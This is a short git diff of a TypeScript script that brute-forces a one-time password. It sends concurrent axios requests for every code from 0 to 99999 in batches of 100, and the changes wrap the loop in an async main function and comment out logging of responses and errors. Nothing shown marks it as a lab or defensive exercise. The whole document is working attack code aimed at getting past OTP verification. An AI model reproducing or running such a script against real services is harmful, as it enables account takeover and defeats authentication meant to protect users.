@@ -18,19 +18,24 @@ async function sendRequest(otp: string) {
     };
 
     try {
-        const response = await axios.request(config);
-        console.log(JSON.stringify(response.data));
+         await axios.request(config);
+        // console.log(JSON.stringify(response.data));
     } catch (error) {
-        console.log(error);
+        // console.log(error);
     }
 }
 
 // sendRequest("264291");
-for(let i = 0; i< 99999;i+=100){
-    const p = []
-    // promise
-    for ( let j = 0; j<100;j++){
-        p.push(sendRequest((i+j).toString()));
+async function main (){
+    for(let i = 0; i<= 99999;i+=100){
+        const p = []
+        console.log(i);
+        // promise
+        for ( let j = 0; j<100;j++){
+            p.push(sendRequest((i+j).toString()));
+        }
+        await Promise.all(p);
     }
-    await Promise.all(p);
+    
 }
+main();
